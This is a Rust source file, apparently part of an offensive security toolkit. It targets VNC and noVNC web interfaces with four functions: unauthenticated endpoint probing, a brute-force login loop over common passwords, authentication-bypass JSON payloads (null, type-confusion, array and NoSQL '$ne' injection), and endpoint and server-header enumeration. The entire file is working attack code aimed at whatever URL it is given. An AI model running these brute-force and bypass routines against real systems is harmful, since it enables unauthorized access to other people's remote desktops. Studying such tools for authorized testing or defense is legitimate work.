use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn access(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} VNC Unauthorized Access", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();

    if status == 200 && (body.contains("vnc") || body.contains("VNC") || body.contains("noVNC")) {
        println!("  {} VNC web interface exposed!", "[!]".red().bold());
    }

    let web_endpoints = ["/vnc.html", "/vnc.html?autoconnect=true", "/websockify", "/vnc_lite.html"];
    for ep in &web_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        if let Ok(r) = client.get(&target).send().await {
            let s = r.status().as_u16();
            if s == 200 {
                println!("  {} {:25} — accessible", "[+]".green().bold(), ep);
            }
        }
    }

    Ok(())
}

pub async fn brute(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} VNC Credential Brute Force", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let passwords = ["", "password", "123456", "admin", "vnc", "root", "passw0rd", "qwerty", "secret", "12345678"];

    for pass in &passwords {
        let body = serde_json::json!({"password": pass, "op": "login"});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && (text.contains("ok") || text.contains("authenticated") || text.contains("true")) {
                    println!("  {} Password: {:15} — AUTH SUCCESS", "[+]".green().bold(), if pass.is_empty() { "(empty)" } else { pass });
                }
            }
            Err(_) => {}
        }
    }

    Ok(())
}

pub async fn bypass(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} VNC Auth Bypass", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let bypass_payloads = [
        ("Empty password", r#"{"password":"","op":"login"}"#),
        ("Null password", r#"{"password":null,"op":"login"}"#),
        ("Type confusion", r#"{"password":true,"op":"login"}"#),
        ("Array bypass", r#"{"password":["admin","password"],"op":"login"}"#),
        ("Object bypass", r#"{"password":{"$ne":null},"op":"login"}"#),
    ];

    for (name, payload) in &bypass_payloads {
        match client.post(url).header("Content-Type", "application/json").body(*payload).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && (text.contains("ok") || text.contains("authenticated")) {
                    println!("  {} {:20} — BYPASS SUCCESS", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} VNC Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let info_endpoints = ["/", "/vnc.html", "/websockify", "/token", "/api/v1/info"];
    for ep in &info_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let headers = r.headers().clone();
                let text = r.text().await.unwrap_or_default();
                if status == 200 {
                    println!("  {} {:20} — {} bytes", "[+]".green().bold(), ep, text.len());
                    if let Some(server) = headers.get("server") {
                        println!("    Server: {}", server.to_str().unwrap_or("unknown"));
                    }
                    if text.contains("RFB") {
                        println!("    {} RFB protocol version detected", "[!]".red().bold());
                    }
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), ep),
        }
    }

    Ok(())
}
